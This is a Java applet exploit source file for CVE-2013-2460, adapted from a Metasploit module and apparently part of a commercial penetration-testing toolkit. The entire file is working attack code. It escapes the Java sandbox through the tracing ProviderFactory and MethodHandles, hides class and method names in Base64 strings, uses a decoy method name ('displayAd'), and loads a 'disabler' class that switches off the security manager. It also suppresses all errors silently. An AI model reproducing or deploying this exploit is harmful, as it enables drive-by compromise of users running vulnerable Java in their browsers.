/*
 * (c) 2013 Strategic Cyber LLC
 *
 * See http://www.advancedpentest.com/license
 *
 * Exploit for CVE-2013-2460
 *
 * Metasploit Framework module: multi/browser/java_jre17_provider_skeleton
 *
 * Adapted from the BSD licensed Metasploit Framework at:
 * /opt/metasploit/msf3/external/source/exploits/cve-2013-2460
 *
 * Original exploit code by mk
 */
import java.applet.Applet;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;

import com.sun.tracing.Provider;
import com.sun.tracing.ProviderFactory;

public class Bean extends Main {
	InvocationHandler invoc = null;
	MethodHandles.Lookup look;

	private static final String bhc = "QmVhbkhlbHBlci5jbGFzcw==";
	private static final String ico = "c3VuLm9yZy5tb3ppbGxhLmphdmFzY3JpcHQuaW50ZXJuYWwuQ29udGV4dA==";
	private static final String dcl = "c3VuLm9yZy5tb3ppbGxhLmphdmFzY3JpcHQuaW50ZXJuYWwuRGVmaW5pbmdDbGFzc0xvYWRlcg==";
	private static final String gcl = "c3VuLm9yZy5tb3ppbGxhLmphdmFzY3JpcHQuaW50ZXJuYWwuR2VuZXJhdGVkQ2xhc3NMb2FkZXI=";
	private static final String lu  = "bG9va3Vw";
	private static final String en  = "ZW50ZXI=";
	private static final String ccl = "Y3JlYXRlQ2xhc3NMb2FkZXI=";
	private static final String jls = "amF2YS5sYW5nLlN0cmluZw==";
	private static final String dc  = "ZGVmaW5lQ2xhc3M=";
	private static final String bh  = "QmVhbkhlbHBlcg==";
	private static final String fn  = "Zm9yTmFtZQ==";

	public Bean(Applet ap) {
		super(ap);
	}

	public void check() {
		try {
			ByteArrayOutputStream classInputStream = new ByteArrayOutputStream();
			byte[] classBuffer = new byte[8192];
			int classLength;

			/* read in our bean helper please */
			InputStream inputStream = getClass().getResourceAsStream(new String(Base64.decode(bhc), "UTF-8"));

			while ((classLength = inputStream.read(classBuffer)) > 0) {
				classInputStream.write(classBuffer, 0, classLength);
			}

			/* do other crap */
			classBuffer = classInputStream.toByteArray();

			ProviderFactory fac = ProviderFactory.getDefaultFactory();
			Provider p = fac.createProvider(BeanProvider.class);
			invoc = Proxy.getInvocationHandler(p);
			Class handle = java.lang.invoke.MethodHandles.class;

			Method m = handle.getMethod(new String(Base64.decode(lu), "UTF-8"), new Class[0]);
			look = (MethodHandles.Lookup) invoc.invoke(null, m, new Object[0]);

			Class context = displayAd(new String(Base64.decode(ico), "UTF-8"));
			Class defClassLoader = displayAd(new String(Base64.decode(dcl), "UTF-8"));
			Class genClassLoader = displayAd(new String(Base64.decode(gcl), "UTF-8"));

			MethodHandle enterMethod = getMethod(context, new String(Base64.decode(en), "UTF-8"), context, new Class[0], true);

			Class argTypes[] = new Class[1];
			argTypes[0] = ClassLoader.class;

			MethodHandle createClassLoader = getMethod(context, new String(Base64.decode(ccl), "UTF-8"), genClassLoader, argTypes, false);

			argTypes = new Class[2];
			argTypes[0] = Class.forName(new String(Base64.decode(jls), "UTF-8"));
			argTypes[1] = (new byte[0]).getClass();

			MethodHandle defineClass = getMethod(defClassLoader, new String(Base64.decode(dc), "UTF-8"), java.lang.Class.class, argTypes, false);

			Object enterContext = enterMethod.invoke();
			Object cLoader = createClassLoader.invoke(enterContext, null);
			Class disabler = (Class) defineClass.invoke(cLoader, new String(Base64.decode(bh), "UTF-8"), classBuffer);
			disabler.newInstance();

			new Thread(this).start();
		}
		catch (Throwable e) {
		}
	}

	private Class displayAd(String className) throws Throwable {
		Class ret = null;

		Class theClass = java.lang.Class.class;

		Class argTypes[] = new Class[1];
		argTypes[0] = String.class;

		Method m = theClass.getMethod(new String(Base64.decode(fn), "UTF-8"), argTypes);

		Object argObjects[] = new Object[1];
		argObjects[0] = className;

		ret = (Class) invoc.invoke(null, m, argObjects);

		return ret;
	}

	private MethodHandle getMethod(Class c, String methodName, Class returnType, Class argTypes[], boolean isStaticMethod) throws NoSuchMethodException, IllegalAccessException {
		MethodHandle ret = null;

		MethodType methodType = MethodType.methodType(returnType, argTypes);

		if (isStaticMethod)
			ret = look.findStatic(c, methodName, methodType);
		else
			ret = look.findVirtual(c, methodName, methodType);

		return ret;
	}
}
